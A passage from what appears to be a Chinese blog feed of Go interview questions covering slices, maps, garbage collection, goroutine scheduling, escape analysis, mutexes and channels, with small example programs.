复制slice1的前3个元素到slice2中</span><br><span class="line">    fmt.Println(slice1, slice2)</span><br><span class="line">    copy(slice1, slice2) // 复制slice2的3个元素到slice1的前3个位置</span><br><span class="line">    fmt.Println(slice1, slice2)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 append() 函数来进行深拷贝，append 会进行扩容（这里涉及到的就是 <a href="https://www.yuque.com/xiaoshan_wgo/gonotes/gguirt">Slice 的扩容机制</a> ）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">func main() &#123;</span><br><span class="line">    a := []int&#123;1, 2, 3&#125;</span><br><span class="line">    b := make([]int, 0)</span><br><span class="line">    b = append(b, a[:]...)</span><br><span class="line">    fmt.Println(a, b)</span><br><span class="line">    a[1] = 1000</span><br><span class="line">    fmt.Println(a, b)</span><br><span class="line">    fmt.Printf(&quot;%p,%p&quot;, a, b)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Go 中切片扩容的策略：</p><ul><li>首先判断，如果新申请容量大于 2 倍的旧容量，最终容量就是新申请的容 量</li><li>否则判断，如果旧切片的长度小于 1024，则最终容量就是旧容量的两倍</li><li>否则判断，如果旧切片长度大于等于 1024，则最终容量从旧容量开始循环 增加原来的 1/4, 直到最终容量大于等于新申请的容量</li><li>如果最终容量计算值溢出，则最终容量就是新申请容量</li></ul><p><strong>注意：如果 slice 在 append() 过程中没有发生扩容，那么修改就在原来的内存中，如果发生了扩容，就修改在新的内存中。</strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 面试题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试题 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang题库（八）</title>
      <link href="/posts/6059.html"/>
      <url>/posts/6059.html</url>
      
        <content type="html"><![CDATA[<h1 id="Golang题库（八）"><a href="#Golang题库（八）" class="headerlink" title="Golang题库（八）"></a>Golang题库（八）</h1><h2 id="go语言的引用类型有什么？"><a href="#go语言的引用类型有什么？" class="headerlink" title="go语言的引用类型有什么？"></a>go语言的引用类型有什么？</h2><ol><li>切片(slice)类型</li><li>map类型 </li><li>管道(channel)类型</li><li>接口(interface)类型</li></ol><h2 id="map的key可以是哪些类型？可以嵌套map吗？"><a href="#map的key可以是哪些类型？可以嵌套map吗？" class="headerlink" title="map的key可以是哪些类型？可以嵌套map吗？"></a>map的key可以是哪些类型？可以嵌套map吗？</h2><ol><li>key的类型<ul><li>bool, </li><li>int，</li><li>string,</li><li>指针</li><li>channel </li><li>interface </li><li>structs</li><li>arrays </li></ul></li><li>map是可以进行嵌套的。</li></ol><h2 id="协程goroutine"><a href="#协程goroutine" class="headerlink" title="协程goroutine"></a>协程goroutine</h2><p>协程是一种用户态的轻量级线程，协程的调度完全由用户控制（进程和线程都是由cpu 内核进行调度）。</p><p>协程拥有自己的寄存器上下文和栈。协程调度切换时，将寄存器上下文和栈保存到其他地方，在切回来的时候，恢复先前保存的寄存器上下文和栈，直接操作栈则基本没有内核切换的开销，可以不加锁的访问全局变量，所以上下文的切换非常快。</p><p>对于进程、线程，都是有内核进行调度，有 CPU 时间片的概念，进行抢占式调度（有多种调度算法）。而对于协程(用户级线程)，这是对内核透明的，也就是系统并不知道有协程的存在，是完全由用户自己的程序进行调度的，因为是由用户程序自己控制，那么就很难像抢占式调度那样做到强制的 CPU 控制权切换到其他进程/线程，通常只能进行协作式调度，需要协程自己主动把控制权转让出去之后，其他协程才能被执行到。</p><p>goroutine和协程区别:<br>本质上，goroutine 就是协程。<br>不同的是，Golang 在 runtime、系统调用等多方面对 goroutine 调度进行了封装和处理，当遇到长时间执行或者进行系统调用时，会主动把当前 goroutine 的CPU § 转让出去，让其他 goroutine 能被调度并执行，也就是 Golang 从语言层面支持了协程。<br>Golang 的一大特色就是从语言层面原生支持协程，在函数或者方法前面加 go关键字就可创建一个协程。</p><h2 id="讲一下set的原理，Java-的HashMap和-go-的map底层原理"><a href="#讲一下set的原理，Java-的HashMap和-go-的map底层原理" class="headerlink" title="讲一下set的原理，Java 的HashMap和 go 的map底层原理"></a>讲一下set的原理，Java 的HashMap和 go 的map底层原理</h2><p><strong>1. Set原理:</strong><br>Set特性: 1. 不包含重复key. 2.无序.<br>如何去重:<br>通过查看源码add(E e)方法，底层实现有一个map，map是HashMap,Hash类型是散列，所以是无序的.<br>如果key值相同，将会覆盖，这就是set为什么能去重的原因(key相同会覆盖).<br><strong>注意:</strong><br>如果new出两个对象add到set中,因为两个对象的地址不相同,所以map在计算key的hash值时，将它当成了两个不同的元素。这时要重写equals和hashcode两个方法。<br>这样才能保证set集合的元素不重复.</p><p><strong>2. Java HashMap:</strong></p><p>线程不安全 安全的map(CurrentHashMap)<br>HashMap由数组+链表组成,数组是HashMap的主体,<br>链表则是为了解决哈希冲突而存在的,如果定位到的数组位置不含链表（当前entry的next指向null）,那么查找，添加等操作很快，仅需一次寻址即可；<br>如果定位到的数组包含链表，对于添加操作，其时间复杂度为O(n)，首先遍历链表，存在即覆盖，否则新增；<br>对于查找操作来讲，仍需遍历链表，然后通过key对象的equals方法逐一比对查找。<br>所以，性能考虑，HashMap中的链表出现越少，性能才会越好。<br>假如一个数组槽位上链上数据过多（即链表过长的情况）导致性能下降该怎么办？<br>JDK1.8在JDK1.7的基础上针对增加了红黑树来进行优化。<br>即当链表超过8时，链表就转换为红黑树，利用红黑树快速增删改查的特点提高HashMap的性能，其中会用到红黑树的插入、删除、查找等算法。</p><p><strong>3. go map:</strong></p><p>线程不安全 安全的map(sync.map)<br>特性: 1. 无序. 2. 长度不固定. 3. 引用类型.<br>底层实现:<br>1.hmap 2.bmap(bucket)<br>hmap中含有n个bmap，是一个数组.<br>每个bucket又以链表的形式向下连接新的bucket.<br>bucket关注三个字段: 1. 高位哈希值 2. 存储key和value的数组 3. 指向扩容bucket的指针<br>高位哈希值: 用于寻找bucket中的哪个key.<br>低位哈希值: 用于寻找当前key属于hmap中的哪个bucket.<br>map的扩容:<br>当map中的元素增长的时候，Go语言会将bucket数组的数量扩充一倍，产生一个新的bucket数组，并将旧数组的数据迁移至新数组。<br>加载因子<br>判断扩充的条件，就是哈希表中的加载因子(即loadFactor)。<br>加载因子是一个阈值，一般表示为：散列包含的元素数 除以 位置总数。是一种“产生冲突机会”和“空间使用”的平衡与折中：加载因子越小，说明空间空置率高，空间使用率小，但是加载因子越大，说明空间利用率上去了，但是“产生冲突机会”高了。<br>每种哈希表的都会有一个加载因子，数值超过加载因子就会为哈希表扩容。<br>Golang的map的加载因子的公式是：map长度 / 2^B(这是代表bmap数组的长度，B是取的低位的位数)阈值是6.5。其中B可以理解为已扩容的次数。<br>当Go的map长度增长到大于加载因子所需的map长度时，Go语言就会将产生一个新的bucket数组，然后把旧的bucket数组移到一个属性字段oldbucket中。注意：并不是立刻把旧的数组中的元素转义到新的bucket当中，而是，只有当访问到具体的某个bucket的时候，会把bucket中的数据转移到新的bucket中。<br>map删除:<br>并不会直接删除旧的bucket，而是把原来的引用去掉，利用GC清除内存。</p><h2 id="⭐go的GC（标记清理-gt-三色标记发-gt-混合写屏障）"><a href="#⭐go的GC（标记清理-gt-三色标记发-gt-混合写屏障）" class="headerlink" title="⭐go的GC（标记清理 -&gt; 三色标记发 -&gt; 混合写屏障）"></a>⭐go的GC（标记清理 -&gt; 三色标记发 -&gt; 混合写屏障）</h2><ol><li><p><strong>标记清除:</strong><br>此算法主要有两个主要的步骤：</p><p>标记(Mark phase)</p><p>清除(Sweep phase)</p><p>第一步，找出不可达的对象，然后做上标记。<br>第二步，回收标记好的对象。</p><p>操作非常简单，但是有一点需要额外注意：mark and sweep算法在执行的时候，需要程序暂停！即 stop the world。<br>也就是说，这段时间程序会卡在哪儿。故中文翻译成 卡顿.</p><p>标记-清扫(Mark And Sweep)算法存在什么问题？<br>标记-清扫(Mark And Sweep)算法这种算法虽然非常的简单，但是还存在一些问题：</p><p>STW，stop the world；让程序暂停，程序出现卡顿。</p><p>标记需要扫描整个heap</p><p>清除数据会产生heap碎片<br>这里面最重要的问题就是：mark-and-sweep 算法会暂停整个程序。</p></li><li><p><strong>三色并发标记法:</strong><br>首先：程序创建的对象都标记为白色。<br>gc开始：扫描所有可到达的对象，标记为灰色<br>从灰色对象中找到其引用对象标记为灰色，把灰色对象本身标记为黑色<br>监视对象中的内存修改，并持续上一步的操作，直到灰色标记的对象不存在<br>此时，gc回收白色对象<br>最后，将所有黑色对象变为白色，并重复以上所有过程。</p></li><li><p><strong>混合写屏障:</strong><br>注意：<br>当gc进行中时，新创建一个对象. 按照三色标记法的步骤,对象会被标记为白色,这样新生成的对象最后会被清除掉，这样会影响程序逻辑.<br>golang引入写屏障机制.可以监控对象的内存修改，并对对象进行重新标记.<br>gc一旦开始，无论是创建对象还是对象的引用改变，都会先变为灰色。</p></li></ol><h2 id="go-中用-for-遍历多次执行-goroutine会存在什么问题"><a href="#go-中用-for-遍历多次执行-goroutine会存在什么问题" class="headerlink" title="go 中用 for 遍历多次执行 goroutine会存在什么问题"></a>go 中用 for 遍历多次执行 goroutine会存在什么问题</h2><p><code>goroutine</code>并非按照<code>for</code>循环的顺序执行协程函数的，因为初始化协程也是消耗资源的，所以<code>go</code>的协程是并发执行的，且<code>for</code>循环的索引，是<code>goroutine</code>准备好再取读取对应的值，所以<strong>可能出现多个<code>goroutine</code>获取到的<code>入参</code>都是同一个值。</strong></p><h2 id="⭐gmp当一个g堵塞时，g、m、p会发生什么"><a href="#⭐gmp当一个g堵塞时，g、m、p会发生什么" class="headerlink" title="⭐gmp当一个g堵塞时，g、m、p会发生什么"></a>⭐gmp当一个g堵塞时，g、m、p会发生什么</h2><p>当g阻塞时，p会和m解绑，去寻找下一个可用的m。<br>g&amp;m在阻塞结束之后会优先寻找之前的p，如果此时p已绑定其他m，当前m会进入休眠，g以可运行的状态进入全局队列。</p><h2 id="⭐（🐮啊，胖🐯）Golang-逃逸分析"><a href="#⭐（🐮啊，胖🐯）Golang-逃逸分析" class="headerlink" title="⭐（🐮啊，胖🐯）Golang 逃逸分析"></a>⭐（🐮啊，胖🐯）Golang 逃逸分析</h2><p>面试官：“写过C/C++的同学都知道，调用著名的malloc和new函数可以在堆上分配一块内存，这块内存的使用和销毁的责任都在程序员。一不小心，就会发生内存泄露。那你说下Golang 是怎么处理这个问题的”</p><p>胖虎：“Golang 通过逃逸分析，对内存管理进行的优化和简化，它可以决定一个变量是分配到堆还栈上。”</p><p><strong>什么是golang的逃逸分析</strong></p><p>面试官：“那你说下什么是逃逸分析吧”</p><p>胖虎想：“这道题我会啊，准备好了吗，我要开始装X了。”</p><p>Golang 的逃逸分析，是指编译器根据代码的特征和生命周期，自动的把变量分配到堆或者是栈上面。</p><p>通过优化了内存管理机制，解放广大程序员的双手。让程序员更关注于业务。</p><p>注意：Go 在编译阶段确立逃逸，并不是在运行时。</p><p><strong>什么是栈与堆</strong></p><p>面试官：“那你说下什么是栈和堆”</p><p>胖虎心：“这个也简单啊”</p><p>栈（ stack）是系统自动分配空间的，例如我们定义一个 char a；系统会自动在栈上为其开辟空间。而堆（heap）则是程序员根据需要自己申请的空间，例如 malloc（10）；开辟十个字节的空间。</p><p>先看下内存分配图</p><p><img src="https://image-1302243118.cos.ap-beijing.myqcloud.com/img/qfMp4K-164889565844810.png" alt="img"></p><p>栈在内存中是从高地址向下分配的，并且连续的，遵循先进后出原则。系统在分配的时候已经确定好了栈的大小空间。栈上面的空间是自动回收的，所以栈上面的数据的生命周期在函数结束后，就被释放掉了。</p><p>堆分配是从低地址向高地址分配的，每次分配的内存大小可能不一致，导致了空间是不连续的，这也产生内存碎片的原因。由于是程序分配，所以效率相对慢些。而堆上的数据只要程序员不释放空间，就一直可以访问到，不过缺点是一旦忘记释放会造成内存泄露。</p><p><img src="https://image-1302243118.cos.ap-beijing.myqcloud.com/img/qfMn4f-164889565844812.png" alt="img"></p><p><strong>逃逸分析有什么好处</strong></p><p>面试官：“那你说下逃逸分析有什么好处吗”</p><p>胖虎：“你是十万个为什么吗？”， 但胖虎还是掏出了自己的看家本领。</p><p>就像刚开始提到的，Go 语言中内存的分配不是有程序员自己决定的，而是通过编译阶段确定的分配到何处。这样有什么好处呢？没错机智的你，可能已经猜到了就是为了优化程序，榨干机器性能，让内存能够得到更高的使用效率。</p><p>通过逃逸分析，那些不需要分配到堆上的变量直接分配到栈上，堆上的变量少了不但同时减少 GC 的压力，还减轻了内存分配的开销。</p><p><strong>常见的逃逸现象</strong></p><p>面试官点点头，称赞的眼光看着胖虎说：“那你在说说，常见的逃逸现象有哪些吧”</p><p>胖虎内心崩溃了：“就我一个人一直在这说，都要渴死了，倒是给我来杯水啊，能不能让我喘口气”。但一想 JD 上面给的薪资还是挺诱惑人的，那就在回答一题。</p><p><strong>func（函数类型）数据类型</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    name := test()</span><br><span class="line">    fmt.Println(name())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">()</span></span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">string</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;后端时光&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行命令</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> build -gcflags=<span class="string">&quot;-m -l&quot;</span> eee.<span class="keyword">go</span></span><br></pre></td></tr></table></figure><p>-m：表示内存分析 -l：表示防止内联优化</p><p>结果如下，第11行变量 name 逃逸到了堆上</p><p><img src="https://image-1302243118.cos.ap-beijing.myqcloud.com/img/qfMrr9-164889565844814.png" alt="img"></p><p><strong>interface{} 数据类型</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    name := <span class="string">&quot;Golang&quot;</span></span><br><span class="line">    fmt.Println(name)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同理执行逃逸分析，结果如下， name 变量也逃逸到堆上了</p><p><img src="https://image-1302243118.cos.ap-beijing.myqcloud.com/img/qfMxMQ-164889565844816.png" alt="img"></p><p>原因是 go/src/fmt/print.go 文件中 Println 传参数类型 interface{}, 编译器对传入的变量类型未知，所有统一处理分配到了堆上面去了。</p><p><img src="https://image-1302243118.cos.ap-beijing.myqcloud.com/img/qfQMIx-164889565844818.png" alt="img"></p><p><strong>指针类型</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    name := point()</span><br><span class="line">    fmt.Println(*name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">point</span><span class="params">()</span></span> *<span class="type">string</span> &#123;</span><br><span class="line">    name := <span class="string">&quot;指针&quot;</span></span><br><span class="line">    <span class="keyword">return</span> &amp;name</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下，第11行变量 name 逃逸到了堆上</p><p><img src="https://image-1302243118.cos.ap-beijing.myqcloud.com/img/qfQtLd-164889565844820.png" alt="img"></p><p>还有其他情况出现变量逃逸吗？</p><p>“额，这……”，胖虎心想：时间太匆忙了，八股文我就背了这么点啊，其他的还么来得及看呢，要是昨天少玩一把游戏就好了。这可怎么办？</p><p>看着胖虎憋的满脸通红，面试官笑呵呵的说，“没事的，时间也不早了，今天先到这吧，你还有什么要问我的吗？”</p><p>胖虎：“还有哪些会出现变量逃逸啊”</p><p>面试官：“channel 或者栈空间不足逃逸, 也会导致逃逸的情况”</p><p><strong>原文出处</strong></p><p><a href="https://mp.weixin.qq.com/s/JXLGLya8ryCMS3g6loTZHw">https://mp.weixin.qq.com/s/JXLGLya8ryCMS3g6loTZHw</a></p><h2 id="获取不到锁会一直等待吗？"><a href="#获取不到锁会一直等待吗？" class="headerlink" title="获取不到锁会一直等待吗？"></a>获取不到锁会一直等待吗？</h2><p>会。<br>在 2016 年 Go 1.9 中 Mutex 增加了饥饿模式，让锁变得更公平，不公平的等待时间限制在 1 毫秒，并且修复了一个大 Bug：总是把唤醒的 goroutine 放在等待队列的尾部，会导致出现不公平的等待时间。那什么时候会进入饥饿模式？1 毫秒，一旦等待者等待时间超过这个时间阈值，就可能会进入饥饿模式，优先让等待着先获取到锁。有饥饿模式自然就有正常模式了，这里就不展开了。你只需要记住，Mutex 锁不会容忍一个 goroutine 被落下，永远没有机会获取锁。Mutex 尽可能地让等待较长的 goroutine 更有机会获取到锁。</p><h2 id="如何实现一个-timeout-的锁？"><a href="#如何实现一个-timeout-的锁？" class="headerlink" title="如何实现一个 timeout 的锁？"></a>如何实现一个 timeout 的锁？</h2><p>用 for 循环和 TryLock 实现。先记录开始的时间，用 for 循环判断是否超时，没有超时则反复尝试 TryLock，直到获取成功；如果超时直接返回失败。可这样有一个问题，高频的 CAS 自旋操作，如果失败的太多，会消耗大量的 CPU，我们需要进行优化，将 TryLock 的抢占实现分为两部分，一个是 fast path，另一个是竞争状态下的，后者的 CAS 操作很多，可以考虑减少 slow 方法的频率，例如调用 n 次 fast path 失败后，再调用一次整个 TryLock。我们还可以借鉴 TCP 重试机制进行优化，for 循环中的重试增加休眠时间，每次失败将休眠时间乘以一个系数，直到达到上限，减少自旋带来的性能损耗。</p><h2 id="go-的切片扩容机制"><a href="#go-的切片扩容机制" class="headerlink" title="go 的切片扩容机制"></a>go 的切片扩容机制</h2><p>1.18之前都是在1024之前翻倍扩容，之后是1.25倍<br>1.18之后在256之后，（1.25倍+192），小切片比较多，减少内存分配次数</p><h2 id="管道是否能二次关闭？"><a href="#管道是否能二次关闭？" class="headerlink" title="管道是否能二次关闭？"></a>管道是否能二次关闭？</h2><p>关闭已关闭的通道</p><p>会引发panic: close of closed channel</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//关闭一个已经关闭的管道</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    channel := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">10</span>)</span><br><span class="line">    <span class="built_in">close</span>(channel)</span><br><span class="line">    <span class="built_in">close</span>(channel)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*[Output]: panic: close of closed channel */</span></span><br></pre></td></tr></table></figure><h2 id="管道关闭是否能读写？"><a href="#管道关闭是否能读写？" class="headerlink" title="管道关闭是否能读写？"></a>管道关闭是否能读写？</h2><ul><li>往已关闭的channel写入会引发panic；</li><li>读已关闭的channel能一直读到东西，但是读到的内容根据通道内关闭前是否有元素而不同。</li></ul><ol><li>如果chan关闭前，buffer内有元素还未读,会正确读到chan内的值，且返回的第二个bool值（是否读成功）为true。</li><li>如果chan关闭前，buffer内有元素已经被读完，chan内无值，接下来所有接收的值都会非阻塞直接成功，返回 channel 元素的零 值，但是第二个bool值一直为false。</li></ol><h2 id="问等待所有goroutine结束，怎么做？"><a href="#问等待所有goroutine结束，怎么做？" class="headerlink" title="问等待所有goroutine结束，怎么做？"></a>问等待所有goroutine结束，怎么做？</h2><h3 id="用channel进行同步-该方法需要知道goroutine的数量"><a href="#用channel进行同步-该方法需要知道goroutine的数量" class="headerlink" title="用channel进行同步(该方法需要知道goroutine的数量)"></a>用channel进行同步(该方法需要知道goroutine的数量)</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">            time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">            fmt.Println(<span class="string">&quot;go routine1&quot;</span>, i)</span><br><span class="line">        &#125;</span><br><span class="line">        ch &lt;- <span class="number">1</span></span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">            time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">            fmt.Println(<span class="string">&quot;go routine2&quot;</span>, i)</span><br><span class="line">        &#125;</span><br><span class="line">        ch &lt;- <span class="number">2</span></span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">2</span>; i++ &#123;</span><br><span class="line">        &lt;-ch</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;main exist&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="用sync-WaitGroup"><a href="#用sync-WaitGroup" class="headerlink" title="用sync.WaitGroup"></a>用sync.WaitGroup</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;time&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;sync&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">        wg.Add(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(i <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">            <span class="keyword">defer</span> wg.Done()</span><br><span class="line">            time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">            fmt.Println(i)</span><br><span class="line">        &#125;(i)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    wg.Wait() <span class="comment">// 等待</span></span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;main exist&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 面试题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试题 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang题库（七）</title>
      <link href="/posts/41935.html"/>
      <url>/posts/41935.html</url>
      
        <content type="html"><![CDATA[<h1 id="Golang题库（七）"><a href="#Golang题库（七）" class="headerlink" title="Golang题库（七）"></a>Golang题库（七）</h1><h2 id="Slice-与-Array-Append"><a href="#Slice-与-Array-Append" class="headerlink" title="Slice 与 Array, Append()"></a>Slice 与 Array, Append()</h2><h3 id="Array"><a href="#Array" class="headerlink" title="Array"></a><strong>Array</strong></h3><p>数组（Array）是一个由固定长度的特定类型元素组成的序列，一个数组可以由零个或多个元素组成。因其长度的不可变动，数组在Go中很少直接使用。把一个大数组传递给函数会消耗很多内存。一般采用数组的切片</p><p>几种初始化方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arr1 := [3]int&#123;1, 2, 3&#125;</span><br><span class="line">arr2 := [...]int&#123;1, 2, 3&#125;</span><br><span class="line">arr3 := [3]int&#123;0:3,1:4&#125;</span><br></pre></td></tr></table></figure><h3 id="Slice"><a href="#Slice" class="headerlink" title="Slice"></a><strong>Slice</strong></h3><p>Slice是一种数据结构，描述与Slice变量本身分开存储的Array的连续部分。 Slice不是Array。Slice描述了Array的一部分。</p><p>slice底层是一个struct</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// runtime/slice.go</span><br><span class="line">type slice struct &#123;</span><br><span class="line">    array unsafe.Pointer// 指向数组的指针</span><br><span class="line">    len   int</span><br><span class="line">    cap   int</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建slice的几种方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// 直接通过make创建，可以指定len、cap</span><br><span class="line">s4 := make([]int, 5, 10)</span><br><span class="line"></span><br><span class="line">// 通过数组/slice 切片生成</span><br><span class="line">var data [10]int</span><br><span class="line">s2 := data[2:8]</span><br><span class="line">s3 := s2[1:3]</span><br><span class="line"></span><br><span class="line">// append()</span><br><span class="line">s6 = append(s4,6)</span><br><span class="line"></span><br><span class="line">// 直接创建</span><br><span class="line">s1 := []int&#123;1, 2&#125;</span><br></pre></td></tr></table></figure><h3 id="append-底层逻辑"><a href="#append-底层逻辑" class="headerlink" title="append() 底层逻辑"></a><strong>append() 底层逻辑</strong></h3><ol><li>计算追加后slice的总长度n</li><li>如果总长度n大于原cap，则调用growslice func进行扩容（cap最小为n，具体扩容规则见growslice）</li><li>对扩容后的slice进行切片，长度为n，获取slice s，用以存储所有的数据</li><li>根据不同的数据类型，调用对应的复制方法，将原slice及追加的slice的数据复制到新的slice</li></ol><h3 id="growslice-计算cap的逻辑"><a href="#growslice-计算cap的逻辑" class="headerlink" title="growslice 计算cap的逻辑"></a><strong>growslice 